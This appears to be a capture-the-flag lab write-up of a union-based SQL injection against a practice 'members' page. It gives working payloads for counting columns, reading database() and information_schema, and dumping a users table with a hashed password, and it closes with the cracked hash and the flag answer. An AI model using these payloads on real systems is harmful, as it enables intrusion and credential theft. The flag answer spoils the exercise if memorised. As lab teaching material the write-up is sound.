# SQLI 1


## Attack scenario

On members I tried basic sqli 

> 1 or 1=1

I got all the members so basically there is sqli in members page second thing to do

> 1 union select 1

got an error:

> The used SELECT statements have a different number of columns

so I need to add more columns till i got the exact number o columns 

> 1 union select 1,2

the message error is gone, now we need to change 1 with 0 so we display only data we want.

> 0 union select 1,2

Lets deisplay the database name to do that we can change 1 or 2 with database function

>  0 union select 1,database()
>  
>  ID: 0 UNION select 1,database() 
>  
> First name: 1
> 
> Surname : Member_Sql_Injection

Now we need to find tables and their columns to do so lets try

> 0 UNION select 1,concat(table_name, 111,column_name) from information_schema.columns 

It worked so basically we concat table and column name I added 111 to separate them because we cant put a char or a string
we got alot of rows, lets search for users, we found users table lets display every column on users table

> 0 UNION select 1,concat(first_name,last_name,user_id,town,country,countersign,Commentaire) from users

flag user got a sus commentaire lets decrypt the countersign

> Decrypt this password -> then lower all the char. Sh256 on it and it's good !
> 
> 5ff9d0165b4f92b14994e5c685cdce28 (the countersign)


we got FortyTwo => tolower() => fortytwo => sha256 => 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
